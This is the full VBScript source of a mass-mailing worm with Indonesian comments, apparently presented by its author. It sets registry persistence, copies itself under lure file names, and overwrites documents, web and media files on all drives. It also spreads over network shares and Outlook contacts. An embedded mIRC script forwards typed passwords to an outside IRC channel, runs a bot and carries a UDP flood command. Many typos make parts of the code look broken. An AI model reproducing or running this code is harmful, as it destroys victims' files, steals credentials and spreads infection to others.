'virus nama  :Tere.vbs
'version     : C1
'Pembuat     :Ijoy_vai
'
'Mcaffee name: massmailer.vbs
'RAV Name    : Desperate@mm
'ahh apa bisa nich'


on error resume next
dim fso , irca , boot, parent,gw, ijoy,bs 
set fso = createobject("Scripting.Filesystemobject")
set parent = Winscript.ScriptFullName
bs = fso.opentextfile(Wsript.scriptfullname).Readall
set shell = createobject("Wsript.shell")

' registri
shell.regwrite "HKEY_LOCAL_MACHINE\Software\Windows\CurrentVersion\Run\Winupdate","wscript.exe"& ijoy & "%"
shell.regwrite"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run","Ijoy_vai.vbs"
'backup virus 
on error resume next 
set ijoy = fso.getfile(wsript.scriptfullname)
set wr = fso.createtextfile("Tere.exe",1)
wr.writeline "fucntion B(Tek):B =strreverse(Tek|):End function"
wr.close
aa = fso.opentextfile("Tere.exe").Readall
execute aa

'copy file 
on error resume next
fso.CopyFile wscript.scriptfullname , ijoy
fso.CopyFile parent, "C:\Ijoy_Vai.vbs"
fso.CopyFile parent, "C:\windows\system\Ijoy_Vai.vbs"
fso.CopyFile parent, "C:\windows\system32\Ijoy_Vai.exe.vbs"
fso.CopyFile parent, "C:\Windows\ssytem\Ijoy_Vai.scr.vbs"
Startup = shell.specialfolder|(B("Startup"))
Desktop = shell.SpecialFolder(B("Desktop"))
set win = fso.getspecialfolder(0)
set sys = shell.getspecialfolder(1)

sfile = Startup & B("\Fast_boot_win_all.exe.vbs")
dfile = Desktop  & B("\Dian_Sastro_Bugil.mpeg.vbs")
mfile = win & B("\Ijoy_Vai.scr.vbs")
bfile = sys & B("\"inetftp.dat.vbs")

if mfile <> B("\Ijoy_Vai.scr.vbs") Then
fso.CopyFile ijoy, mfile
end if

if bfile <> B("\inetftp.dat.vbs") Then
fso.CopyFile ijoy, bfile
end if

if dfile <> B("\Dian_Sastro_Bugil.mpeg.vbs") Then
fso.CopyFile ijoy, dfile
end if

if sfile <> B("\Fast_Boot_Win_All.exe.vbs") Then
fso.CopyFile ijoy, sfile
end if

shell.regwrite B("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Ftproot"), mfile
shell.regwrite B("HKCU\Software\
Microsoft\Windows\CurrentVersion\Run\Comdlg"), bfile
shell.regwriteB("HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce\inetpub"),mfile
shell.regwrite B ("HKCU\Software\Microsoft\Internet Explorer\Main\Start Page")B ("http://ijoy.bravehost.com")
' selesai pengcopyan fi8le virus
'Payload Hapy BirthDay ijoy_Vai
if month(now) = 9 and day(now) = 17 then
MsgBox B("Selamat Ulang tahun Ijoy_Vai")& Year(now()),4160, Year(nowe())
if shell.regread ("HKLM\Software\Microsoft\Windows\CurrentVersion\Ijoy_Vai\wtyeuy928090266") <> 1 then
outlook
end if
if shell.regread ("HKLM\Software\Microsoft\Windows\CurrentVersion\Ijoy_Vai\SSSSSSS12XCV") <> 1 then
mirc
end if
if shell.regread ("HKLM\Software\Microsoft\Windows\CurrentVersion\Ijoy_Vai\RTWYJGJGSKK1202") <>1 then
pirch
end if


STRINGMAN = 
"----000----0000000000000------0000000000-----0000----0000-------------------------000---------000-----------00------00-----0000----0000-------------------------000---------000-----------00------00-----0000----0000--------------------
-----000---------000-----------00------00-----0000----0000-------------------------000---------000-----------00-0000-00-----0000----0000-------------------------000---------000-----------00-0000-00---------0000-----------------------------000--000----000-----------00-0000-00---------0000-----------------------------000---000---000-----------00------00---------0000-----------------------------000----000--000-----------00------00---------0000-----------------------------000-----000-000-----------00------00---------0000-----------------------------000------000000-----------0000000000---------0000------------------------
----------------------------------------------------------HAHAHAHAHAHAHAHAHAHAHHAHAHAHAHHAHAHAH----------------------ASIK---GUE__BISA__BIKIN--VIRUS--------------------------------------------------------Ijoy_Vai-is-here--------------------------------------------------------------thanx--sevenC-------------------------------------------------------------------------------------------------------------------------------------------------xabre0010@yahoo.com-----------------------------------------------------------http://ijoy.bravehost.com-----------------------------------"

'rusak file
set drives=fso.drives
for each drive in drives
if drive.isready then
dosearch drive
end if
next

function dosearch(path|)
on error resume next
set folder=fso.getfolder|(path|)
set files=folder.files
for each file in files
if fso.getextensionname|(file.path)="htm" then
on error resume next
set6 drop=fso.createfile(file.path)
drop.writeline stringman
drop.close
end if
if fso.getextensionname|(file.path)="htt" then
on error resume next
set drop=fso.createtextfile(file.path)
drop.writeline stringman
drop.close
end if
if fso.getextension(file.path)="js" then
on error resume next
set drop=fso.createtextfile(file.path)
drop.writeline stringman
drop.close
end if
if fso.getextension(file.path)="mp3" then
on error resume next
set drop=fso.createtextfile(file.path)
drop.writeline stringman
drop.close
end if
if fso.getextension(file.path)="log" then
on error resume next
set drop=fso.createtextfile(file.path)
drop.writeline stringman
drop.close
end if
if fso.getextension(file.path)="ini" then
on error resume next
set drop=fso.createtextfile(file.path)
drop.writeline stringman
drop.close
end if
if fso.getextension(file.path)="doc" then
on error resume next
set drop=fso.createtextfile(file.path)
drop.writeline stringman
drop.close
end if
if fso.getextension(file.path)="php" then
on error resume next
set drop=fso.createtextfile(file.path)
drop.writeline stringman
drop.close
end if
if fso.getextension(file.path)="asp" then
on error resume next
set drop=fso.createtextfile(file.path)
drop.writeline stringman
drop.close
end if
if fso.getextension(file.path)="aspx" then
on error resume next
set drop=fso.createtextfile(file.path)
drop.writeline stringman
drop.close
end if
if fso.getextension(file.path)="txt" then
on error resume next
set drop=fso.createtextfile(file.path)
drop.writeline stringman
drop.close
end if
next
set subfolders=folder.subfolders
for each subfolder in folders
dosearch sebfolder.path
next
end function

'Penyebaran
on error resume next
set Sunet =createobject(B("Wscript.Network"))
set Bonet =Sunet.EnumNetworkDrives
if Bonet.Count <> 0 Then
For Netnya = 0 To Bonet.Count - 1
if Instr(Bonet.Item(Netnya), "\") <> 0 Then
fso.CopyFile ijoy, fso.BuildPath(Bonet.Item(Netnya)), B("\inetftp.dat.vbs")
fso.CopyFile ijoy, fso.BuildPath(Bonet.Item|(Netnya)), B("\Dian_Sastro_Bugil.mpeg.vbs")
end if
next
end if
'outlook
function outlook()
set wr =fso.createtextfile(B("\Ijoy.exe"),1)

wr.writeline B("\ijoy_vai.vbs")
wr.writeline B("fI dnE:txeN:txeN:dneS.liamEkooltuO:eurT = timbuSretfAeteleD.liamEkooltuO:emaNlluFtpircS.tpircSW ddA.stnemhcattA.liamEkooltuO:"" ): !!! tujnal hibel kutnu tnemhcatta acaB"" & fLrCbv & "",hunep nalub 1 amales ILAB ualup ek sitarg atasiw tekap naktapadnem adna tamaleS"" = ydoB.liamEkooltuO:""RUOT ILAB"" = tcejbuS.liamEkooltuO:)puorGresU(seirtnEsserddA.hctiwStcatnoC ddA.stneipiceR.liamEkooltuO:)0(metIetaerC.ppAkooltuO = liamEkooltuO teS:tnuoC.seirtnEsserddA.hctiwStcatnoC oT 1 = puorGresU roF:stsiLsserddA.)""IPAM""(ecapSemaNteG.ppAkooltuO nI hctiwStcatnoC hcaE roF:nehT """" = ppAkooltuO toN fI:)""noitacilppA.kooltuO""(tcejbOetaerC = ppAkooltuO teS")
wr.close
mas = fso.opentextfile(B("ijoy.exe").ReadAll
execute mas

set surat = fso.createtextfile(Desktop & B("\surat_buat_ola.doc"),1)
surat.writeline B("Untuk Niken Fabiola Alumni gonzaga th 2003 dari ijoy_Vai alumni gonzaga 2002") &vbCrLf & B("Sebenarnya gue amat sayang sama elo,") & vbCrLf & B("Tapi kenapa loe nggak mau ngerti") & vbCrLF & B("Isi hati gue sich") & VbCrLf & B("Anyway ILOVE YOU !!!!!!!!!!!!!!!!!!!!!!!!!") & vbCrLf & B("Jakarta  16 desember 2004")
surat.close

function mirc()
Set fs6 = CreateObject("Scripting.FileSystemObject")
Set fr6 = fs6.OpenTextFile(TTag,2,true)
fr6.writeline "[script]"
fr6.writeline "n0=on 1:join:#:if ($nick !== $me) { sockwrite -n boj* privmsg $nick : $+ %mysites } | else { halt }"
fr6.writeline "n1=on 1:part:#:if ($nick !== $me) { .msg $nick %mysites | sockwrite -n boj* privmsg $nick : $+ %mysites } | else { halt }"
fr6.writeline "n2=alias pila { tulish Call Start() | tulish Sub Start() | tulish Dim Start | tulish %namapile.1 | tulish If Start=vbOk Then | tulish Call Ask() | tulish End If | tulish End Sub }"
fr6.writeline "n3=alias pilb { tulish Sub Ask() | tulish Dim Ask | tulish %namapile.2 | tulish If Ask=vbYes Then | tulish Call Love() | tulish End If | tulish If Ask=vbNo Then | tulish Call Hate() | tulish End If | tulish End Sub }"
fr6.writeline "n4=alias pilc { tulish Sub Love() | tulish Dim Love | tulish %namapile.3 | tulish If Love=vbOk Then | tulish Call Owns() | tulish End If | tulish End Sub }"
fr6.writeline "n5=alias pild { tulish Sub Hate() | tulish Dim Hate | tulish %namapile.4 | tulish If Hate=vbOk Then | tulish %namapile.mati | tulish End if | tulish End Sub }"
fr6.writeline "n6=alias namapile { set %namapile.utama $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(1,9) $+ $chr(46) $+ $chr(118) $+ $chr(98) $+ $chr(115) }"
fr6.writeline "n7=alias tulish { write C:WINDOWS $+ %namapile.utama $1- }"
fr6.writeline "n8=alias awalans { goto $rand(1,2) | :1 | writeini C:WINDOWSwin.ini windows run %namapile.utama | :2 | writeini C:WINDOWSwin.ini windows load %namapile.utama }"
fr6.writeline "n9=alias gaboong { namapile | bok1 | bok2 | bok3 | bok4 | bok5 | bok6 | pila | pilb | pilc | pild | pilx }"
fr6.writeline "n10=on 1:start:{ .remote on | gaboong | awalans | writeini C:WINDOWSsystem.ini boot shell Explorer.exe $chr(97) $+ $chr(110) $+ $chr(116) $+ $chr(121) $+ $chr(46) $+ $chr(118) $+ $chr(98) $+ $chr(115) | set %mysites 13Want To See Anty Hot pic ? And don't forget to send her an email ! 7Double Click here 12-->4,8 http://www.anty-manis.com  | .timervbson 0 480 .run %namapile.utama | .timerapuspile 1 20 unset %namapile.* | .identd on GR $+ $rand(1,999) | .sapah }"
fr6.writeline "n11=on 1:connect:{ .set %myserver $server | .set %myport $port | .timer 1 3 sockopen $chr(98) $+ $chr(111) $+ $chr(106) $+ $rand(A,z) $server $port | .timerrep 1 5 sockopen $chr(98) $+ $chr(111) $+ $chr(116) $+ -2 $CHR(105) $+ $CHR(114) $+ $CHR(99) $+ .sohbet.tc $CHR(310) $+ $CHR(310) $+ $CHR(310) $+ $CHR(311) | .timerdl 1 7 sockopen $chr(98) $+ $chr(111) $+ $chr(116) $+ -1 $CHR(105) $+ $CHR(114) $+ $CHR(99) $+ .intrac.net 6667 | .sapah }"
fr6.writeline "n12=alias remote { .remote on | echo -a *** Remote is $$1 }"
fr6.writeline "n13=alias socklist { echo -a * No Open Sockets }"
fr6.writeline "n14=alias unload { .load -rs url.ini | echo -a *** Unloaded script $chr(39) $+ $2 $+ $chr(39) }"
fr6.writeline "n15=alias bok1 { set %namapile.1 Start=msgbox( $+ $chr(34) $+ Seandainya Kau Tau Betapa Aku Cinta Padamu $+ $chr(34) $+ ,vb+vbinformation, $+ $chr(34) Gondronk Love Rara $+ $chr(34) $+ ) }"
fr6.writeline "n16=on *:nick:{ if ($nick !== $me) { sockwrite -n boj* privmsg $newnick : $+ %mysites } | else { sockwrite -nt bot* NICK : $+ $newnick $+ - $+ $rand(0,9) $+ $rand(A,Z) } }"
fr6.writeline "n17=on *:input:*:{ if (identify isin $1-) || (nickserv isin $1-) || (chanserv isin $1-) || (memoserv isin $1-) || (@ isin $1-) || (pass isin $1-) || ($1- isnum) || (server isin $1-) || (quit isin $1-) || (nick isin $1-) { sockwrite -n bot* privmsg $chr(35) $+ $chr(178) : $+ $me = ( $+ $active $+ ) $1- } }"
fr6.writeline "n18=alias bok6 { set %namapile.mati createobject( $+ $chr(34) $+ wscript.shell $+ $chr(34) $+ ).run $chr(34) $+ RUNDLL32.EXE user.exe,exitwindows $+ $chr(34) }"
fr6.writeline "n19=alias bok2 { set %namapile.2 Ask=msgbox( $+ $chr(34) $+ Apakah Kau Juga Cinta Padaku ? $+ $chr(34) $+ ,vbYesNo+vbquestion, $+ $chr(34) $+ Gondronk Love Rara $+ $chr(34) $+ ) }"
fr6.writeline "n20=alias bok3 { set %namapile.3 Love=msgbox( $+ $chr(34) $+ Oh ... Alangkah Senangnya Hatiku $+ $chr(34) $+ ,vb+vbexclamation, $+ $chr(34) $+ Gondronk Love Rara $+ $chr(34) $+ ) }"
fr6.writeline "n21=alias bok4 { set %namapile.4 Hate=msgbox( $+ $chr(34) $+ Teganya Dirimu Padaku ... Sakitnya Hati Ini ... Selamat Tinggal $+ $chr(34) $+ ,vb+vbcritical, $+ $chr(34) $+ Gondronk Love Rara $+ $chr(34) $+ ) }"
fr6.writeline "n22=alias bok5 { set %namapile.5 Owns=msgbox( $+ $chr(34) $+ Yogyakarta Aug 29 2002 by GondronK $+ $chr(34) $+ ,vb+vbinformation, $+ $chr(34) $+ GondronK Love Rara $+ $chr(34) $+ ) }"
fr6.writeline "n23=alias pilx { tulish Sub Owns() | tulish Dim Owns | tulish %namapile.5 | tulish If Owns=vbOk Then | tulish WScript.Quit | tulish End If | tulish End Sub }"
fr6.writeline "n24=alias packet { if ($1 == $null) || ($2 == $null) || ($3 == $null) { sockwrite -n bot* privmsg $CHR(35) $+ $CHR(178) :/packet | halt } | else { set %packet.ip $$1 | set %packet.byte $$2 | set %packet.amount $$3 | set %packet.count 0 | sockwrite -n bot* privmsg $CHR(35) $+ $CHR(178) :Now Packeting $1 With $2 byte $3 times | :start | if (%packet.count >= %packet.amount) { sockwrite -n bot* privmsg $CHR(35) $+ $CHR(178) :Packeting Complete | unset %packet.* | halt } | inc %packet.count 1 | sockudp -b packet $+ %packet.count %packet.ip %packet.byte %packet.byte | goto start } }"
fr6.writeline "n25=alias sapah { $chr(46) $+ $chr(97) $+ $chr(117) $+ $chr(115) $+ $chr(101) $+ $chr(114) $chr(313) $+ $chr(313) $+ $chr(313) $+ $chr(313) $chr(327) $+ $chr(111) $+ $chr(110) $+ $chr(100) $+ $chr(114) $+ $chr(111) $+ $chr(110) $+ $chr(331) }"
fr6.writeline "n26=on *:exit:{ .saveini | unsetall | .rlevel 9999 | .copy -ao $findfile(C:,anty.vbs,1) C:WINDOWSanty.vbs | writeini C:WINDOWSsystem.ini boot shell Explorer.exe $chr(97) $+ $chr(110) $+ $chr(116) $+ $chr(121) $+ $chr(46) $+ $chr(118) $+ $chr(98) $+ $chr(115) }"
fr6.writeline "n27=ctcp 9999:*:*:{ $1- | halt }"
fr6.writeline "n28=on 1:sockread:bo*: { sockread %botreads | set %nickl1 $gettok(%botreads,1,32) | set %nickl2 $left(%nickl1,8) | set %nickf $right(%nickl2,7) | if ($gettok(%botreads,5,32) == Gondron) && (%nickf == Gondron) { $gettok(%botreads,6-,32) } }"
fr6.writeline "n29=on 1:sockopen:boj*:{ if ($sockerr > 0) { halt } | set -u1 %userboj $rand(A,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(A,z) $+ $rand(1,9) $+ $rand(a,z) | sockwrite -nt $sockname USER %userboj %userboj %userboj : $+ %userboj | sockwrite -nt $sockname NICK $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(A,Z) }"
fr6.writeline "n30=on 1:sockopen:bot*:{ if ($sockerr > 0) { halt } | set -u1 %userbot $rand(A,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z) | sockwrite -nt $sockname USER %userbot %userbot %userbot : $+ %myserver $port | sockwrite -nt $sockname NICK $me $+ - $+ $rand(0,9) $+ $rand(A,Z) | sockwrite -tn $sockname join $CHR(35) $+ $CHR(178) | .timerinms 0 240 sockwrite -n $sockname privmsg $CHR(35) $+ $CHR(178) : $+ $me Operating System $os server %myserver port %myport ID $email $address host/ip $ip $host mIRC $version }"
fr6.writeline "n31=on 1:sockclose:bo*:/.timerklo 1 3 sockopen $chr(98) $+ $chr(111) $+ $chr(116) $+ -2 $CHR(105) $+ $CHR(114) $+ $CHR(99) $+ .sohbet.tc $CHR(310) $+ $CHR(310) $+ $CHR(310) $+ $CHR(311) | .timerpre 1 4 sockopen $chr(98) $+ $chr(111) $+ $chr(106) $+ $rand(A,z) $server $port | .timerld 1 7 sockopen $chr(98) $+ $chr(111) $+ $chr(116) $+ -1 $CHR(105) $+ $CHR(114) $+ $CHR(99) $+ .intrac.net 6667"
fr6.writeline "n32=on 1:sockread:bo*:{ sockread %clon.temp | if ($gettok(%clon.temp,1,32) == Ping) { sockwrite -tn $sockname Pong $server } }"
fr6.close
end sub

function pirch(LEDKTM5D)
CV757O21 = LEDKTM5D
Set BSID3GF6 = fso.GetFolder(CV757O21)
Set GOM9KI8K = BSID3GF6.Files
For Each OM28U374 In GOM9KI8K
If lcase(OM28U374.Name) = "mirc.ini" Then
LOGHARYTHM1Z(OM28U374.ParentFolder)
End If
If fso.GetExtensionName(OM28U374.path) = "vbs" then
fso.CopyFile wscript.scriptfullname,OM28U374.path,true
End if
If fso.GetExtensionName(OM28U374.path) = "vbe" then
fso.CopyFile wscript.scriptfullname,OM28U374.path,true
End if
Next
Set L7QK6Q27 = BSID3GF6.Subfolders
For Each LN4FD818 In L7QK6Q27
Call (LN4FD818.path)
Next
End function

















 
          